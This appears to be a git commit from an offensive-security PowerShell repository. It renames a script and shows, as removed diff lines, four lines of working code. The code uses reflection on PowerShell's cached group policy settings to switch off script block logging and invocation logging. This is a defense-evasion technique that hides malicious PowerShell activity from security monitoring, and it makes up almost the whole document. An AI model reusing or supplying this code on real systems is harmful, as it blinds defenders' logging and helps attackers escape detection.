ea02a25938c22245974ac59c53a32abef7eea63c
S3cur3Th1sSh1t <27858067+S3cur3Th1sSh1t@users.noreply.github.com>
2021-03-08 09:32:26 +0100

    Update and rename Disable-ScriptBlockLogging_Reflection.ps1 to Disable-ScriptBlockLogging_Reflection_Working.ps1

--- PowershellScripts/Disable-ScriptBlockLogging_Reflection.ps1
+++
@@ -1,4 +0,0 @@
-$GroupPolicySettingsField = [ref].Assembly.GetType('System.Management.Automation.Utils').GetField('cachedGroupPolicySettings', 'NonPublic,Static')
-$GroupPolicySettings = $GroupPolicySettingsField.GetValue($null)
-$GroupPolicySettings['ScriptBlockLogging']['EnableScriptBlockLogging'] = 0
-$GroupPolicySettings['ScriptBlockLogging']['EnableScriptBlockInvocationLogging'] = 0
